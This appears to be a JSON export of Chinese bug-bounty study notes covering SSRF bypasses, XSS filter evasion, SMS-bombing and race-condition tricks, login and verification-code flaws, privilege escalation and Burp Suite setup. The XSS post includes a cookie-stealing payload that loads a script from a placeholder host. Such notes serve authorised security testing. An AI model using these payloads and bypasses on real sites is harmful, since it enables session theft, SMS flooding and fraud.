[{"title":"SRC-burpsuite心跳包","url":"/2025/07/28/Burpsuite%E5%BF%83%E8%B7%B3%E5%8C%85%E8%BF%87%E6%BB%A4/","content":"Burpsuite心跳包过滤filter 筛选器//以下排除内容都为半匹配，即包含以下任意内容都会被过滤掉//需要排除的域名String[] domainExclude = &#123;    &quot;freebuf.com&quot;,    &quot;h5.youzan.com&quot;,    //百度    &quot;baidu.com&quot;,    &quot;baidu.hk&quot;,    &quot;bdstatic.com&quot;,    &quot;bcebos.com&quot;,    &quot;aiqicha.com&quot;,    &quot;aiqicha.cn&quot;,    //腾讯    &quot;tencent.com&quot;,    &quot;qq.com&quot;,    //google    &quot;google.com&quot;,    &quot;googleapis.com&quot;,    &quot;google.com.hk&quot;,    &quot;gstatic.com&quot;,    //阿里    &quot;alicdn.com&quot;,    &quot;tool.lu&quot;,    &quot;github.com&quot;,    //360    &quot;360.net&quot;,    &quot;360.cn&quot;,    //火狐    &quot;mozilla.net&quot;,    &quot;firefox.com&quot;,    //bing    &quot;bing.cn&quot;,    &quot;zsxq.com&quot;,    //奇安信    &quot;qianxin.com&quot;    &#125;;//需要排除的请求路径或文件后缀String[] pathExclude = &#123;&quot;WebSocket&quot;, &quot;.css&quot;, &quot;.png&quot;, &quot;.svg&quot;&#125;;//需要排除的HTTP方法String[] methodExclude = &#123;&quot;OPTIONS&quot;, &quot;HEAD&quot;&#125;;//需要排除的响应类型，包括图片、字体文件、二进制、CSS、脚本文件//MimeType[] mimetypeExclude = &#123;//    MimeType.APPLICATION_UNKNOWN, MimeType.UNRECOGNIZED,//    MimeType.FONT_WOFF2, MimeType.FONT_WOFF,//    MimeType.VIDEO, MimeType.SOUND,//    MimeType.IMAGE_TIFF, MimeType.IMAGE_BMP,  MimeType.IMAGE_PNG, MimeType.IMAGE_GIF, MimeType.IMAGE_JPEG, MimeType.IMAGE_UNKNOWN,//    MimeType.CSS//    &#125;;//需要排除的请求体内容String[] bodyExclude = &#123;&quot;&quot;&#125;;String host = requestResponse.request().httpService().host();String path = requestResponse.request().path();String method = requestResponse.request().method();String body = requestResponse.request().body().toString();var mimeType = requestResponse.mimeType();return Arrays.stream(domainExclude).noneMatch(it -&gt; host.contains(it))     &amp;&amp; Arrays.stream(pathExclude).noneMatch(it -&gt; path.contains(it))     &amp;&amp; Arrays.stream(methodExclude).noneMatch(it -&gt; method.contains(it))//   &amp;&amp; Arrays.stream(mimetypeExclude).noneMatch(it -&gt; mimeType == it)     &amp;&amp; Arrays.stream(bodyExclude).filter(it -&gt; it != null &amp;&amp; it.length() != 0).noneMatch(it -&gt; body.contains(it));       \n\n\n\n\n\n","categories":["bp"],"tags":["src","burpsuite"]},{"title":"ssrf","url":"/2024/11/17/SSRF/","content":"SSRF 漏洞挖掘SSRF类型1. 全回显SSRF2. 无回显SSRF(shellshock 命令执行)\nBP插件–collaborate everywhere 探测注入点\nBP: target-&gt;选中对应站点，右击Add to Scope-&gt;yes-&gt;目标网页上浏览点击，以便插件寻找定位漏洞\n\nshellshock+header 搜索payload\n\n\n无回显SSRF RCE从而达到危害最大化\nSSRF绕过1. 绕过某种特定限制\n基础版\n@ : 绕过域名\n当后端对域名做了限制，导致域名不可更改\nhttp://www.baidu.com@10.1.1.1 实际上访问的时10.1.1.1\n\n升级\n\\ + @ 绕过\nhttp://www.xxx.com/proxy?url=http:///10.1.1.1 -&gt; 403\nhttp://www.xxx.com/proxy?url=http:///10.1.1.1\\@www.xxx.com  -&gt; 200\n成功访问到内网\n\n绕过后缀\n/#/\n用于绕过后缀不可更改\nhttp://10.1.1.1:80/#/a.jpg -&gt; http://10.1.1.1:80\n\n\n2. DNS重绑定利用爆破或者并发绕过\n3. 302重定向利用vps作为跳板，访问vps，进而跳转到内网中\n","categories":["SRC"],"tags":["src","SSRF"]},{"title":"xss","url":"/2024/11/26/XSS%E6%BC%8F%E6%B4%9E/","content":"XSS漏洞1. XSS绕过 – 标签&#x2F;属性1. 转义绕过&lt;h1&gt;    a&lt;/h1&gt;\n\n\n这种简单标签无法解析，说明&lt;&gt;被html实体编码为 &amp;lt, &amp;gt, 可以尝试url编码(对&lt;和&gt;进行url编码)， 或url双编码\n\n&lt;input name=&quot;keyword&quot; name=&quot;1234&quot;&gt;\nvalue的值如果有特殊字符，就会被实体化，此时可用onfocus绕过\n&lt;input name=&quot;keyword&quot; value=&#x27;&#x27; onfocus=&quot;javascript:alert(1)&quot; &#x27;&#x27;&gt;\n\n2. 属性内容回HTML实体编码绕过注意：实体编码只能属于*属性内容，也就是如下位置*\n&lt;img src=1 onerror=&quot;alert(1)&quot; /&gt;\n\n如果想要使用 alert(1) ,但是被拦截了，就可以用实体编码：\n\n先进行HTML实体编码\n再将html实体编码后的内容进行url编码（&amp;在url中会被识别为参数分隔符）\n\n3. 类双写绕过删除过滤有的过滤是直接删除，可以用类双写绕过waf\n\n例如waf对，多个关键字进行了删除过滤\non&lt;script&gt;load=\n过滤删除&lt;script&gt;,剩下onload\n\n\n\n4. fuzz进行bypass(重点)使用burp爆破未检测的标签和属性\nCross-Site Scripting (XSS) Cheat Sheet - 2024 Edition | Web Security Academy\n\n先跑可用属性\n再找对应标签来触发该属性\n\n5. 常用标签和属性&lt;img src=1 onerror=alert(1)&gt;&lt;img src=&quot;https://www.baidu.com/favicon.ico&quot; onload=alert(1)&gt;&lt;svg onload=alert(1)&gt;  &lt;!-- dom 无法使用 --&gt;&lt;video src=&quot;正常视频&quot; oncanplay=alert(1)&gt;&lt;input autofocus onfocus=alert(1)&gt;  &lt;!-- 自动聚焦到当前元素，导致执行--&gt;&lt;a id=x tabindex=1 autofocus onfocus=alert(1) href=1 &gt;\n\n2. XSS绕过 – JS技巧如果可以绕过属性，标签，但是无法弹框或者跳转等方式被拦截，即 alert() 被拦截\n1. unicode编码绕过（不用加引号）js中的字母会自动进行unicode解码，可以用unicode绕过\nalert(1) -&gt; \\u0061\\u006c\\u0065\\u0072\\u0074(1)\n2. JS8&#x2F;ascii 编码绕过（需要加引号）JS中的字符串可以用 JS8/ascii 编码绕过关键字过滤\nascii: alert(1) -&gt; \\x61\\x6C\\x65\\x72\\x74\njs8:    alert(1) -&gt; \\141\\154\\145\\162\\164\\50\\61\\51\n3. 平替window对象的几个全局函数window.alert(1) //window指浏览器页面this.alert(1)  //this只想当前窗口parent.alert(1)  //也可平替window对象self.alert(1)frames.alert(1)top.alert(1)\n\n这些方式的作用\nJS中访问对象有多种方式：\nwindow.alert(1)  //这样的alert(1)是代码，只能进行unicode编码window[&#x27;alert&#x27;](1)  //这样的alert是字符串，可以进行JS8和ascii编码//或者进行分割window[&#x27;ale&#x27;+&#x27;rt&#x27;](1)//或进行拼接window[&#x27;al&#x27;.concat(&#x27;ert&#x27;)](1)//纯数字，利用ascii的10进制编码window[String.fromCharCode(97,108,101,114,116)](1)\n\n4. 无括号调用函数(括号被过滤时使用)\n反引号\n`$&#123;alert(1)&#125;`  //模板字符串//延申用法alert `1`\n\nSymbol.hasInstanceof\n//需要引号class A&#123;static [Symbol.hasInstance]=eval&#125;; &#x27;alert\\x281\\x29&#x27; instanceof A&#x27;alert\\x281\\x29&#x27; instanceof &#123;[Symbol.hasInstance]:eval&#125;\n\n instanceof 是运算符，用于判断左操作数是不是右操作数的实例    \nSymbol.hasInstance指向一个函数, eval，用于自定义对象在instanceof运算时的行为，即指定使用哪个函数来检查左操作数是不是右操作数的实例    \n这里Symbol.hasInstance函数并没有指向函数，而是指向了 eval \n而 eval 是一个全局函数用于执行字符串中的 JavaScript 代码    \n即使用 eval 函数来检查 alert(1) 是否是有操作数的实例，自然就造成了弹框        \n这里的’’内的东西用的ascii，用JS8也可以\n\n\n5. 字符串转代码1. eval\t\t\t\t\teval(&quot;alert(1)&quot;)2. setTimeout     setTimeout(&quot;alert(1)&quot;, 0)3. setInterval      setInterval(&quot;alert(1)&quot;,999)4. 匿名函数          (()=&gt;&#123;alert(1)&#125;)``\t\t\t\t\t\t\t\t(()=&gt;&#123;alert(1)&#125;)()5. 署名函数          Function(&quot;alert(1)&quot;)``\t\t\t\t\t\t\t\tFunction(&quot;alert(1)&quot;)()6. 原型链              &quot;&quot;.at.constructor(&quot;alert(1)&quot;)()\t\t\t\t\t\t\t\t&quot;&quot;[&#x27;at&#x27;][&#x27;constructor&#x27;](&quot;alert(1)&quot;)()  //可以换种方式访问对象，全部转化为字符串7. Symbol.hasInstanceof\n\n6. base64过滤关键字btoa(&#x27;alert(1)&#x27;)   //编码atob(&#x27;YWxlcnQoMSk=&#x27;)   //解码eval(atob(&#x27;YWxlcnQoMSk=&#x27;))\n\n同样，也可以换成ascii和JS8编码绕过\n7. 弱类型js是弱类型语言，会进行类型转换，所以就延伸了下面这一种绕过方式\nJSFUCK\nJSFuck - Write any JavaScript with 6 Characters: !+\n3. 特殊情况\n闭合引号后，等号被删除，即不允许使用属性\n\n闭合标签\n\n\n双引号被转义\n\n&lt;input xxx value=&quot;\\\\\\&quot; onload=xxx \\&quot;&quot;&gt;\n结果&lt;input xxx value&#x3D;”\\&quot; onload&#x3D;xxx &quot;“&gt;\n\n\n\n\nXSS payload\nxss-img-cookie:\n&lt;img src=1 onerror=&#x27;s==document.createElement(`script`);s.src=`https://xxx/cookie.js`;document.body.appendChild(s)&#x27;&gt;\n\nswagger-ui xss\n?configUrl=https://raw.githubusercontent.com/VictorNS69/swagger-ui-xss/main/config.json\n\n","categories":["SRC"],"tags":["src","xss"]},{"title":"api 漏洞","url":"/2024/08/01/api/","content":"API漏洞挖掘1. API文档找到一个请求特定资源的api端点路径，可以逐步删除每一层路径直至发现api文档\n例如：/api/swagger/v1/users/123 可以依次审查下面的路径\n\n/api/swagger/v1/users/\n/api/swagger/v1/users\n/api/swagger/v1/\n…\n\n2. 识别API端点通过与API端点交互的方式来确定API端点的详细信息\n\nAPI端点支持的 HTTP 请求方法\n通常可以用 OPTIONS 请求方法来确定所请求资源支持的请求方法\n\nAPI端点支持的 Content-Type 类型\n可以从报错信息中发现所支持的 Content-Type 类型\n而且也可能从不同的 Content-Type 类型中发现漏洞\n\n\n3. 发现隐藏参数对同一API端点不同的请求方法包含的请求体或者返回的结果中参数可能会有差异，对比这些差异从而发现可利用的参数\n例如：对 /api/users \n\nPATCH 系统发出的请求中，请求体中包含的参数为\n&#123;    &quot;username&quot;: &quot;wiener&quot;,    &quot;email&quot;: &quot;wiener@example.com&quot;,&#125;\n\n但是对于 GET /api/users/123 请求方法，返回结果中包含的参数\n&#123;    &quot;id&quot;: 123,    &quot;name&quot;: &quot;John Doe&quot;,    &quot;email&quot;: &quot;john@example.com&quot;,    &quot;isAdmin&quot;: &quot;false&quot;&#125;\n\n所以可以尝试在 PATCH 方法的请求体中加入 isAdmin \n","categories":["SRC"],"tags":["src","api"]},{"title":"js未授权","url":"/2024/11/11/js%E6%9C%AA%E6%8E%88%E6%9D%83/","content":"JS未授权漏洞1. 敏感接口探测\n网站功能不全\n看到一些网站提供的功能，牢记 增删改查 四个功能。尤其注意一些网站没有在页面上提供的功能，利用同一页面上可用的功能的接口，在js中查找，有可能会发现其他隐藏接口\n\n有些地方进不去，需要邀请或者授权\n利用 find something 查找接口，然后把接口补充完整(主要是补充一些参数值)。然后在bp里面进行测试\n\n\n2. 手动查找JS中的隐藏接口是findsomething，经过测试并无可以利用的点，而此时也没有一个要寻找的目标关键字，那我们就只能通过查找Js中的接口关键字来寻找隐藏的接口\n寻找接口关键字\ntype:&quot;POST&quot;type: &quot;GET&quot;post(&quot;get(&quot;ashx?ashxurl:url:&quot;url:&#x27;path:path:&quot;path:&#x27;action?dataparams\n\n未授权漏洞技巧有时候访问某个接口发现返回500，这时可以在请求包中添加两个参数\n&#123;    &quot;PageNo&quot;: 1,    &quot;PageSize&quot;: 10&#125;\n\n这样可能就会有新发现\n","categories":["SRC"],"tags":["src"]},{"title":"hunter查询语法","url":"/2024/11/17/hunter%E6%9F%A5%E8%AF%A2%E8%AF%AD%E6%B3%95/","content":"hunter 查询语法\n京东\n(domain=&quot;jd.com&quot; or domain=&quot;jdcloud.com&quot; or domain=&quot;wuliujie.com&quot; or domain=&quot;jdl.com&quot; or domain=&quot;jdx.com&quot; or domain=&quot;selling.cn&quot;) and domain!=&quot;qianxun.com&quot; and web.title!=&quot;Welcome to&quot; and web.title!=&quot;京东(JD.COM)-正品低价&quot; and web.title!=&quot;Investor Home&quot; and web.title!=&quot;您所访问的页面不存在&quot; and web.title!=&quot;undefined&quot; and web.title!==&quot;京东&quot; and web.title!=&quot;出错了&quot; and web.title!==&quot;&quot; and icp.name=&quot;京东&quot; and header.status_code==&quot;200&quot; and title!=&quot;故障&quot; and title!=&quot;不存在&quot; and title!=&quot;堡垒&quot; and title!=&quot;京东云&quot;\n\n百度\ndomain=&quot;baidu.com&quot; and icp.name=&quot;百度&quot; and header.status_code==&quot;200&quot; and web.title!=&quot;百度新闻&quot; and web.title!=&quot;百度一下&quot; and web.title!=&quot;百度地图&quot; and web.title!=&quot;页面不存在&quot; and web.title!=&quot;&quot; and web.title!=&quot;百度网盘&quot; and web.title!=&quot;welcome&quot; and web.title!=&quot;/(ㄒoㄒ)/~~&quot; and web.title!=&quot;出错&quot;\n\n","categories":["信息收集"],"tags":["src","hunter语法"]},{"title":"短信轰炸","url":"/2024/11/11/sms_bomb/","content":"逻辑漏洞短信轰炸漏洞挖掘1. 漏洞点任意可以发送短信邮箱验证码的地方\n2. 绕过技巧\n参数后加空格,+\n\n参数叠加\n比如：phone&#x3D;1333333333&amp;phone&#x3D;13333333333\n\n修改时间参数\n比如：时间戳\n\n手机号参数头添加+86\n\n手机号参数后加点：13333333333...\n这种情况下，每加一个点可以多发一次短信，如此可以借助bp Intrude模块\n\nip验证：使用代理池，每发一次短信更换一次ip\n\n请求头绕过，分析请求头中用于验证的部分，然后更改\n\n并发绕过\n\n\n并发漏洞1. 漏洞高危场景\n领取优惠券\n充值\n提现\n订单支付\n\n2. 工具1. Turbo Intrude\nbp插件模块中导入插件\n非定向爆破(单纯并发发送请求，不需要修改参数)：请求头中添加 req: %s\n定向爆破(需要更改请求中某些字段值)：在该字段的值处设置%s\n\nbp自带Intrude模块\n按照下图方式设置\n\n\n\n","categories":["SRC"],"tags":["src","逻辑漏洞"]},{"title":"burpsuite配置","url":"/2024/11/11/tools_bp_setting/","content":"挖洞环境配置bp批量自动改包\n应用场景：存在权限校验的场景可以尝试\n因为在有些站点只在前端进行了校验，后端未作验证，可以用这种方法绕过，从而获取高级权限。\n\n操作方法：Proxy -&gt; Proxy settings -&gt; Tools -&gt; Proxy -&gt; Match and replace rules  改响应包，即 response body\n\n\n\n过滤杂包\n浏览器代理插件设置，走bp代理的模式下将不走代理的域名写入不代理的地址列表那一栏。\n\n\nbp中设置，bp中对应的包中右键然后选中 Don&#39;t intercept requests -&gt; To this host,这样就会跳过该包对应的host。这个方法和下面的方法相同的原理。\n\n在bp的 Proxy settings 中设置，如下图位置\n\n\n\n","categories":["bp"],"tags":["src","burpsuite"]},{"title":"SRC-信息收集","url":"/2024/10/30/information_collect/","content":"src信息收集1. src平台官方公告（src公告存在测试范围）\n精确到站点\n\n有赞，字节\n\n\n只给出根域\n\n看云，易宠\n\n子域名收集\n\noneforall（被动信息收集）\n配置网络空间搜索引擎api key \n\n灯塔\n\nlayer（子域名挖掘机）(主动信息收集)\n\n网络空间搜索引擎（fofa, hunter, quake）\n\n\n\n\n\n\n2. 获取更多根域\n企查查（咸鱼，淘宝资产代导出）\n\n知识产权\n\n备案域名\n通过这个方法查的话，把域名放入浏览器访问看能不能得到东西，注意不要放到地址栏，放到搜索框看\n\n公众号\n\n小程序\n\napp\n\n\n\n\n\n爱企查（爬虫）\n\n\n","categories":["信息收集"],"tags":["src","信息收集"]},{"title":"proxy设置","url":"/2024/11/24/%E4%B8%8D%E4%BB%A3%E7%90%86%E5%9F%9F%E5%90%8D/","content":"127.0.0.1192.168.1.142.193.236.11:5003[::1]localhost*.google.com*.gstatic.com*.googleapis.com*.google.com.hk*.google-analytics.com*.googlesyndication.com*.googletagmanager.com*.chrome.com*.zxking.top*.tool.lu*.githubassets.comgithub.com*.github.com*.github.io*.qianxin.comquake.360.net*.mozilla.net*.fofa.info*.firefox.com*.bing.cn*.360.cn*.zsxq.com*.tencent.com*.geetest.com*.baidu.com*.weixin.qq.com*.sensorsdata.cn*.apollo.autofaxingbao.com*.yoojia.comgeetest.datasink.sensorsdata.cn*.miit.gov.cn*.vulbox.com*.qq.com*.mediav.comas.vivo.com*.vivo.com*.msftncsi.com*.gvt1.com*.live.com*.myqcloud.com*.yuque.com*.alipayobjects.com*.alipay.com*.alibaba-inc.com*.alicdn.com*.aliyuncs.com*.listary.com*.butian.net*.bountyteam.com*.geekyoung.com*.qqmail.com*.weixinbridge.com*.csdn.net*.baidustatic.com*.csdnimg.cn*.pstatp.com*.ipchaxun.com*.clarity.ms*.rubiconproject.com*.doubleclick.net*.jsdelivr.net*.turn.com*.adform.net*.ad-m.asia*.criteo.com*.pubmatic.com*.dreamsmart.com*.cnzz.com*.bootcss.com*.todesk.com\n","categories":["SRC"],"tags":["src","proxy"]},{"title":"SRC-并发漏洞","url":"/2024/11/11/%E5%B9%B6%E5%8F%91/","content":"并发漏洞1. Turbo Intrude – bp 插件\n将要爆破的数据包发送到这个插件中，在插件窗口的请求头中任意位置添加 %s 占位符，然后测试\n或者请求头中添加\nx-req:%s\n\n\n\n在插件窗口中如图位置设置并发次数\n\n\n\n2. 挖掘技巧突破限制\n短信轰炸\n验证有效性：src平台公告要求；平台限制一个手机号一天接受次数\n\n抽奖\n\n替换响应包导致抽奖结果固定\n\n对抽奖请求包进行并发\n\n结果只抽了一次\n\n抽了多次，只消耗了一次积分\n\n抽了多次消耗了对应数量积分（积分足够）\n\n抽取次数超过积分上限，积分清零\n\n抽了多次，消耗了对应次数积分，导致最后积分为负\n最后一种情况最常见\n\n\n\n\n\n提现&amp;兑换\n提现总量或兑换总量超过余额，导致余额为负\n\n\n事半功倍同样操作获得更多报酬。\n如：点赞，收藏，关注，订阅，刷积分，提现，兑换，退款，投票（存在最多），评价，抽奖，设为最佳回答(百度知道，获取更多积分，并发获取更多)，积分退回\n并发利用绕waf\n","categories":["SRC"],"tags":["src","并发"]},{"title":"app&小程序抓包","url":"/2024/11/11/%E5%B0%8F%E7%A8%8B%E5%BA%8F&app%E6%8A%93%E5%8C%85/","content":"小程序&amp;app抓包小程序1. Proxifier\nProfile -&gt; Proxy Servers -&gt; add 新建一条代理，指向bp\n\nProfile -&gt; Proxification Rules -&gt; add 新建一条代理规则\n\n\n\n2. Reqable\nbp新建一条监听规则\n\n\nReqable联动bp\n代理 -&gt; 二级代理 -&gt; 新建\n监听地址和端口填写bp中新建的监听器的\n\n\n\n","categories":["SRC"],"tags":["src","burpsuite"]},{"title":"登录口漏洞","url":"/2024/11/08/%E7%99%BB%E5%BD%95%E5%8F%A3%E6%BC%8F%E6%B4%9E/","content":"登录口漏洞场景\n登录\n任意用户登录，弱口令，万能密码，session模拟登录，Js审查（代码中存在密码泄露）\n\n注册\n如果没有提供注册功能，可以尝试手动构造注册接口\n任意用户注册（注册已存在账户造成账号接管）\n\n密码重置\n任意用户密码重置，默认密码，session覆盖\n\n验证码\n短信，图片，邮箱三类验证码\n\n\n任意用户登录\n常见\n\n手机号和验证码未绑定：用自己手机号接收验证码之后，改成其他手机号\n一值传多参：加逗号，一个值带多个参数\n多值混淆：mobile&#x3D;153xxxx&amp;mobile&#x3D;134xxxxx\n\n\n第三方\n\n第三方软件登录：微博&#x2F;微信&#x2F;qq – wxid：xxxx(根据wxid识别账户)\n第三方软件登录：微博&#x2F;微信&#x2F;qq – userid：xxxx(根据userid识别账户)\n登录状态下点击授权：点击后携带参数\n\n对这些登录过程进行抓包\n\n其他\n登录无二次验证\n\n\n任意用户注册\n邮箱发送激活链接注册\n\n信息填写完成后的返回包存在泄露 active code 或 激活id\n信息填写完成后跳转等待激活页面存在泄露active code 或 激活id\n\n\n尝试注册高权限账号（利用企业域名注册企业邮箱等）\n注册的账号权限越高，越好挖。\n\nxxxx@企业域名\nwhois查询手机号邮箱\n\n\n\n短信验证码\n短信轰炸\n%09%0a%0c%0d%0b%a0+86\n\n+86 如果在界面中没有显示，但是抓包时有可以修改从而绕过\n\n验证码复用：填正确的验证码发送到repeater模块一直重放，若是不提示验证码错误而一直提示账密错误则存在验证码复用即验证码不过期\n\n验证码爆破：4，6位都可作为漏洞提交，只要公告中没有明确说明不收\n6位的话，先接收一个，然后在这一个验证码上下1000个以内利用bp爆破\n\n报错回显：填写错误的，响应数据包中存在正确的验证码\n\n绑定关系失效\n\n手机号与验证码未绑定\n双写绕过\n手机号参数写两个手机号，用 , 或 空格 或 | 隔开\n传入两个手机号参数\n\n\n\n\n修改参数\n\n状态码\n鉴权相应参数\n改 true\n\n\n删除验证码字段\n\n同意初始化：测试 0000 none true 1111 null 置空\n\n\n密码重置\n不验证原密码&amp;原密码可绕过\n+csrf 提高危害，构造链接让受害者访问达到用户密码重置。\n\n\n","categories":["SRC"],"tags":["src"]},{"title":"越权/未授权","url":"/2024/12/03/%E8%B6%8A%E6%9D%83_%E6%9C%AA%E6%8E%88%E6%9D%83/","content":"越权漏洞水平越权\n考虑 增删改查 四个功能点都看一下\n有些地方又筛选，也要注意下\nbp里面开启自动替换，设置规则，一般就是 false -&gt; true\n\n垂直越权1. 获取账号\n手动创建账号\n创建两个不同权限的账号\n\n没有创建账号的功能\n对系统进行越权\n\n\n2. 测试\n子主账号场景\n记录主账号关键操作的请求包，再替换鉴权字段值为子账号\n\n单账号场景\n\n\n401 绕过\n路径中双写斜杠 / \nGitHub - 0x727&#x2F;BypassPro: 401绕过自动化bp插件\n\n未授权测试思路1. 响应改请求有些情况下响应数据包中会返回json格式的数据，这时候可以把响应体中的数据放到请求体中，修改其中部分字段值，测试是否可以读取数据\n2. 修改响应头中的鉴权字段值如 set-cookie 或者 userid(这个userid是出现在响应头中的)\n","categories":["SRC"],"tags":["src","逻辑漏洞"]}]